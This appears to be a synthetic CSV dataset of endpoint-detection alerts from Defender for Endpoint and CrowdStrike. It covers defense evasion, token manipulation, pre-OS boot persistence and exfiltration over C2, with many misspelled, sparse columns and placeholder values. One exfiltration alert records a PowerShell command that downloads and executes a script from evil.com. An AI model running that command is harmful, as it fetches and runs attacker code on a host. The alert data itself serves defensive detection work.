AlertID,AlertTimestamp,MachineId,ComputerName,Severity,AlertName,AlertType,Category,AlertDescription,Status,ExtendedProperties,event_id,event_type,event_timestamp,event_category,severity,detect_description,detect_id,technique,device_name,file_name,file_size,src_path,dst_path,user_name,process_name,AlertSeverity,Recommendation,RuleName,Source,Tactic,Technique,AlertCategory,HostName,FilePath,ProcessName,CommandLine,MD5Hash,SHA256Hash,IPAddress,UserName,ProcessID,ParentProcessID,DetectionId,event_description,Details,EndpointID,EndpointName,ParentProcessName,ParentProcessPath,ProcessPath,host,user,process,network,detection,FallbackProtocol,DestinationIP,DestinationPort,artifact_hiding,security_control_disablement,Event,Host,User,Action,Reason,event_time,alert_rule_name,technique_name,tactic,process_id,command_line,destination_ip,destination_port,source_ip,source_port,ProcessId,DestinationIp,SourceIp,SourcePort,AlertTimestamps,file_path,file_hash,process_hash,parent_process_name,parent_process_hash,registry_modification,subtype,recommendation,detection_details,product,mitre,endpoint,attack_details,event_severity,protocol,process_command_line,parent_process_command_line,parent_process_id,SourceIP,Protocol,ProcessCommandLine,ParentProcessCommandLine,event_categfory,event_Timestamp,Affected_Hostname,Affected_File_Path,Alert_Source,alert_severity,action_taken,detection_source,ProcessHash,ProcessParentName,ProcessParentPath,ProcessParentHash,tactics,affected_entities,recommendations,source,destination,threat_severity,threat_category,threat_name,indicators,ioc,description,Description,Endpoint,DetectionSource,AlertyDescription,MACAddress,EventLogName,EventLogMessage,AdditionalInfo,AffectedHost,AffectedProcess,AffectedFilePath,Commandline,ParentProcess,DetectionMethod,RecommendedActions,event_catefory,affected_hosts,event_details,event_name,alert_type,event,Field,Operator,Value,Tags,RegistryKey,RegistryValue,type,timestamp,Title,Affected_Image_Path,Timestamp,Injected_Process_Name,Loader_Process_Name,Loader_Technique,event_Source,EventType,EventCategory,TargetResource,Operation,SuspiciousAction,Domain_Controller_IP,Domain_Controller_Name,EntityName,EntityType,Hostname,event_version,event_categorty,kill_chain,image_loaded,target_image_loaded,target_image_name,target_command_line,detection_method,AlertNmae,IP,OS,category,action,event_data,data,ArtifactType,ArtifactPath,ArtifactName,sensor_id,customer_id,event_info,AffectedHostname,AffectedFile_Path,AlertSource,Parent_Process_Name,Injection_Technique,technique_id,subtechnique_id,subtechnique,additional_info,vendor,path,domain,ip_address,Name,event_subtype,src_ip,dst_ip,container_name,image_name,image_digest,registry,command,process_path,username,actor,host_info,event_url,event_hash,event_action,event_source,OperatingSystem,web_server_url,web_server_method,AssignedTo,ClosedTime,DataTTL,DetectionTime,DetectionType,IsIncident,LastUpdateTime,DomainName,DnsName,FullyQualifiedDomainName,NetBiosName,OSPlatform,OSVersion,ProcessorArchitecture,CreationTime,End,FileHash,FileName,Start,VendorName,VendorSeverity,VendorThreatName,trigger,remediation,metadata,process_injection,ControlName,file_write,actions,alert_data,tags,Type,Condition,ImageLoaded,TargetImageLoaded,TargetImageName,TargetCommandLine,KillchainPhase,TechniqueID,Techniqu,Affected_Device,Affected_User,Malicious_Executable,detection_id,detection_time,detection_score,threat_score,device_id,device_external_ip,device_os,device_os_version,policy_name,policy_id,subcategory,rule_name,hostname,ip,process_pid,files,MachineName,sha1_hash,local_ip,public_ip,malware_family,org_id,event_event_name,kill_chain_phases,data_source,DeviceName,DeviceId,OsPlatform,OsVersion,ProcessCreationTime,ParentProcessCreationTime,TargetDevice,TargetDeviceId,TargetOsPlatform,TargetOsVersion,TargetUserName,AlertDDescription,Endpoint_ID,Endpoint_Name,Endpoint_IP,Process_Name,parent_process_pid,c2,native_function_calls,TECHNIQUE,SourceIPAddress,DestinationIPAddress,Domain,ThreatName,IOC,TimestampUtc,SHA256,WebServiceName,WebServicePath,file,parent_process,os,pid,access_type,operation,InjectedProcessName,InjectionTechnique,AleertDescription,AlertDetails,mitre_technique,ContainerImageName,ContainerRuntime,DeploymentMethod,ParentProcessId,EndpointIP,C2Server,ExfiltratedData,ExfiltrationMethod,UserDomain,ProcessParentID,Detection_Details,Process_Path,Process_Command_Line,AffectedImagePath,machine_id,user_id,alert_name,remote_address,remote_port,local_address,local_port,AlertId,RemoteServer,ParentCommandLine,EventID,Hash,ParentHash,ExecutionStatus,event_cagtegory,remediation_steps,AffectedHostInfo,DetectionDetails,TECHNIQUE_NAME,TACTIC,Signer,Process Name,PID,Path,HostIP,KillChain,EndpointDetails,detected_by,details,device,TargetUser,OriginalPermissions,NewPermissions,cloud_infrastructure_modification,CloudProvider,APIOperation,evebnt_category,EntityValue,creationTimeUtc,status,recommendedActions,vendorInformation,properties,src_port,remote_ip,Target,Port,AffectedEndpoints,IndicatorsOfCompromise,RemovableMediaName,RemovableMediaVendor,RemovableMediaType,RemovableMediaSerialNumber,RemovableMediaCapacity,RemovableMediaAccessedTime,RemovableMediaAction,AffectedFileSize,TechniqueName,ProcessPid,ParentProcessPid,Direction,RemoteServiceName,RemoteServiceType,RemoteServicePorts,RemoteServiceIpv4,RemoteServiceIpv6,RemoteServiceUrl,RemoteServiceCertificate,RemoteServiceEncryption,RemoteServiceAuthentication,RemoteServiceVersion,RemoteServiceProduct,RemoteServiceOrganization,file_permission_modification,Product,AttackType,AttackDuration,AffectedServices,EventTime,application,threat,affected_host,alert_category,alert_recommendation,alert_details,References,target,attack_name,affected_process,affected_file_path,recommended_actions,host_name,md5_hash,sha256_hash,AlertTimestampUtc,EventId,WebServerUrl,WebServerMethod,process_execution,event_ category,detect_name,rule_description,triggered_rule,remote_server,CloudAccount,endpoint_id,web_service_name,web_service_path,ProcessParentCommandLine,AttackVector,alert_rule_id,alert_state,alert_time,src,process_tree,ioc_type,ioc_value,process_details,host_details,file_info,network_info,email_sender,email_recipient,email_subject,email_urls,email_attachments,ip_addresses,mac_addresses,operating_system,agent_version,group_name,Vendor,Username,name,event_creator,mitre_attack_id,cloud_account,detection_info,URL,file_deletion,AttackTactic,AttackTechnique,EntityId,EntityIp,MachineDomainName,AlertLink,AlertTime,UserInfo,PhishingInfo,DetectionID,EventHash,AffectedEntities,KillChainPhase,RemediationSteps,Alertescription,modified_time,original_hash,current_hash,event)category,combined_data
234567,2022-04-05T13:45:00Z,,,High,Inter-Process Communication,,,,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defender for Endpoint EDR,,,,,,,,,,,,"['Terminate the suspicious processes.', 'Review and block any network traffic associated with these processes.', 'Perform a full system scan to ensure no other malicious processes are running on the system.']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution,"Detected suspicious inter-process communication between Process A and Process B. Process A, a known trusted process, was found communicating with Process B, a command line tool. This is indicative of possible defense evasion and command and control activity. Further investigation is recommended.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 234567. AlertTimestamp is 2022-04-05T13:45:00Z. Severity is High. AlertName is Inter-Process Communication. Tactic is Defense Evasion. DetectionSource is Defender for Endpoint EDR. RecommendedActions are Terminate the suspicious processes.; Review and block any network traffic associated with these processes.; Perform a full system scan to ensure no other malicious processes are running on the system.; AleertDescription is Adversaries may abuse inter-process communication (IPC) mechanisms for local code or command execution. AlertDetails is Detected suspicious inter-process communication between Process A and Process B. Process A, a known trusted process, was found communicating with Process B, a command line tool. This is indicative of possible defense evasion and command and control activity. Further investigation is recommended.. "
1234567,2023-03-09T15:45:00Z,,,High,Proxy Connection,Endpoint detection,,Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Network Traffic,,,,,,,,,,,Proxy Detection,"['Investigate the use of a proxy in the environment', 'Identify the source and destination of the proxy traffic', 'Monitor for any further suspicious activity']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 1234567. AlertTimestamp is 2023-03-09T15:45:00Z. Severity is High. AlertName is Proxy Connection. AlertType is Endpoint detection. AlertDescription is Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure.. DetectionSource is Network Traffic. DetectionMethod is Proxy Detection. RecommendedActions are Investigate the use of a proxy in the environment; Identify the source and destination of the proxy traffic; Monitor for any further suspicious activity; 
,,,,,,,,,,,12345,threat_detection,1646749633000,Access Token Manipulation Detected,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Access Token Manipulation has been detected on endpoint.,,,,,,,"{'hostname': 'endpoint1', 'ip': '192.168.1.100', 'os': 'Windows 10 Pro', 'user': 'JohnDoe'}",,,,,,,,,,,,,,,2023-03-10T12:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Endpoint Detection and Response,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Access Token Manipulation (T1134),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 12345. event_type is threat_detection. event_timestamp is 1646749633000. event_category is Access Token Manipulation Detected. severity is High. event_description is Access Token Manipulation has been detected on endpoint.. host hostname is endpoint1. host ip is 192.168.1.100. host os is Windows 10 Pro. host user is JohnDoe. event_time is 2023-03-10T12:00:00Z. category is Endpoint Detection and Response. mitre_technique is Access Token Manipulation (T1134). 
0303345,2022-04-05T08:32:15Z,,,High,Possible deployment of unauthorized container on host,,,This alert is triggered when an attempt to deploy an unauthorized container is detected on a host.,,,,,,,,,,,,,,,,,,,,,,Defense Evasion,Deploy Container,Container Security,Host01,/usr/bin/docker,,docker run -itd unauthorized-image:latest,,,,,,,,,,,,,,,,,,,,,,,,,,,john.doe,,,,,,,,,,,,,1234.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,unauthorized-image:latest,Docker,docker run,5678.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 0303345. AlertTimestamp is 2022-04-05T08:32:15Z. Severity is High. AlertName is Possible deployment of unauthorized container on host. AlertDescription is This alert is triggered when an attempt to deploy an unauthorized container is detected on a host.. Tactic is Defense Evasion. Technique is Deploy Container. AlertCategory is Container Security. HostName is Host01. FilePath is /usr/bin/docker. CommandLine is docker run -itd unauthorized-image:latest. User is john.doe. ContainerImageName is unauthorized-image:latest. ContainerRuntime is Docker. DeploymentMethod is docker run. 
0009090,2023-03-08T14:30:00Z,,,High,Exfiltration Over C2 Channel Detected,,,This alert is triggered when data exfiltration is detected over a Command and Control (C2) channel on an endpoint.,,,,,,,,,,,,,,,,,,,,,,,,,,,powershell.exe,,,,,JohnDoe,1234.0,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'),,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-08T14:00:00Z,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,evil.com,SensitiveData.txt,HTTP,DOMAIN,5678.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 0009090. AlertTimestamp is 2023-03-08T14:30:00Z. Severity is High. AlertName is Exfiltration Over C2 Channel Detected. AlertDescription is This alert is triggered when data exfiltration is detected over a Command and Control (C2) channel on an endpoint.. ProcessName is powershell.exe. UserName is JohnDoe. EndpointName is DESKTOP-ABC123. ProcessCommandLine is powershell.exe -nop -c IEX (New-Object Net.WebClient).DownloadString('http://evil.com/malware.ps1'). ProcessParentName is explorer.exe. ProcessCreationTime is 2023-03-08T14:00:00Z. EndpointIP is 192.168.1.100. C2Server is evil.com. ExfiltratedData is SensitiveData.txt. ExfiltrationMethod is HTTP. UserDomain is DOMAIN. 
pr4p5-f,,,,High,Native API,,System Call,Defender for Endpoint has detected suspicious use of a Native API on the system.,,,,,,,,,,,,,,,,,,,Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.,,,,Native API (T1106),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Defender for Endpoint detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.",C:\Windows\explorer.exe,"explorer.exe /root,C:\Windows\system32",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is pr4p5-f. Severity is High. AlertName is Native API. Category is System Call. AlertDescription is Defender for Endpoint has detected suspicious use of a Native API on the system.. Recommendation is Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.. Technique is Native API (T1106). Process_Name is explorer.exe. Detection_Details is Defender for Endpoint detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.. Process_Path is C:\Windows\explorer.exe. Process_Command_Line is explorer.exe /root,C:\Windows\system32. "
3-04-5-ft5,2023-03-10T12:00:00Z,,,Critical,Pre-OS Boot,,,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system.",,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.,,,Persistence,Pre-OS Boot,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\bootmgr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertID is 3-04-5-ft5. AlertTimestamp is 2023-03-10T12:00:00Z. Severity is Critical. AlertName is Pre-OS Boot. AlertDescription is Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system.. Recommendation is Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.. Tactic is Persistence. Technique is Pre-OS Boot. AffectedHostname is hostname123. AlertSource is Defender for Endpoint EDR. AffectedImagePath is C:\Windows\System32\bootmgr. "
defender_endpoint_alert_12345,2022-01-01T12:34:56.789Z,,,,RAdmin Tool Used to Remotely Control Workstations,,,Remote access tools (RAdmin) may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,,,,,,,High,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234.0,,,,,,,,,,,,,,,,,,,,,,,,,TCP,C:\Program Files (x86)\RAdmin Viewer\rview.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,RAdmin Tool Used,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,machine-12345,user-67890,RAdmin Tool Used to Remotely Control Workstations,192.168.1.100,4899.0,192.168.1.101,1234.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is defender_endpoint_alert_12345. AlertTimestamp is 2022-01-01T12:34:56.789Z. AlertName is RAdmin Tool Used to Remotely Control Workstations. AlertDescription is Remote access tools (RAdmin) may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.. severity is High. protocol is TCP. process_command_line is C:\Program Files (x86)\RAdmin Viewer\rview.exe. alert_type is RAdmin Tool Used. machine_id is machine-12345. user_id is user-67890. alert_name is RAdmin Tool Used to Remotely Control Workstations. remote_address is 192.168.1.100. local_address is 192.168.1.101. 
,2023-03-08T14:30:00Z,,,Medium,Scheduled Transfer,,,"This alert is triggered when a file transfer occurs, which may indicate scheduled transfer activity. This could be an indication of malicious activity, and warrants further investigation.",,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,robocopy C:\LocalFolder \\RemoteServer\Share /E,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,1234.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,12345678-1234-1234-1234-123456789012,\\RemoteServer\Share,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"AlertTimestamp is 2023-03-08T14:30:00Z. Severity is Medium. AlertName is Scheduled Transfer. AlertDescription is This alert is triggered when a file transfer occurs, which may indicate scheduled transfer activity. This could be an indication of malicious activity, and warrants further investigation.. ProcessName is cmd.exe. CommandLine is robocopy C:\LocalFolder \\RemoteServer\Share /E. DetectionSource is Microsoft Defender for Endpoint. AlertId is 12345678-1234-1234-1234-123456789012. RemoteServer is \\RemoteServer\Share. "
0pd0d03wr,2023-03-03T10:15:30Z,,,,Serverless Execution,,,Potential serverless execution detected via PowerShell execution with encoded command.,,,,,,,,,,,,,,,,,,High,,,,Execution,Serverless Execution,,,,powershell.exe,-EncodedCommand,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Defender for Endpoint,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Process Creation,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,powershell.exe -encodedCommand,4688.0,9D73B2CF2A1C728FE8B282FDC7EE5DE5,2E20D26F9C1ACB5547D5BDA70FEBD054,Blocked,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AlertID is 0pd0d03wr. AlertTimestamp is 2023-03-03T10:15:30Z. AlertName is Serverless Execution. AlertDescription is Potential serverless execution detected via PowerShell execution with encoded command.. AlertSeverity is High. Tactic is Execution. Technique is Serverless Execution. ProcessName is powershell.exe. CommandLine is -EncodedCommand. ParentProcessName is cmd.exe. DetectionSource is Defender for Endpoint. EventType is Process Creation. ParentCommandLine is powershell.exe -encodedCommand. Hash is 9D73B2CF2A1C728FE8B282FDC7EE5DE5. ParentHash is 2E20D26F9C1ACB5547D5BDA70FEBD054. ExecutionStatus is Blocked. 
,,,,,,,,,,,040t0y0,treaffic signaling,2023-03-09T12:30:00Z,,high,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CrowdStrike Falcon has detected unusual network traffic on the endpoint that could be indicative of traffic signaling activity.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"{'hostname': 'EXAMPLE-HOSTNAME', 'ip_address': '192.168.0.100', 'operating_system': 'Windows 10'}",,,,,,,,,,,,,,,,,,CrowdStrike Falcon,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unusual network traffic detected,"['Isolate the affected endpoint from the network', 'Terminate any suspicious processes or connections', 'Scan the endpoint for malware or signs of compromise', 'Patch any known vulnerabilities in the endpoint or software applications']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,event_id is 040t0y0. event_type is treaffic signaling. event_timestamp is 2023-03-09T12:30:00Z. severity is high. event_description is CrowdStrike Falcon has detected unusual network traffic on the endpoint that could be indicative of traffic signaling activity.. endpoint hostname is EXAMPLE-HOSTNAME. endpoint ip_address is 192.168.0.100. endpoint operating_system is Windows 10. detection_source is CrowdStrike Falcon. event_cagtegory is Unusual network traffic detected. remediation_steps are Isolate the affected endpoint from the network; Terminate any suspicious processes or connections; Scan the endpoint for malware or signs of compromise; Patch any known vulnerabilities in the endpoint or software applications; 
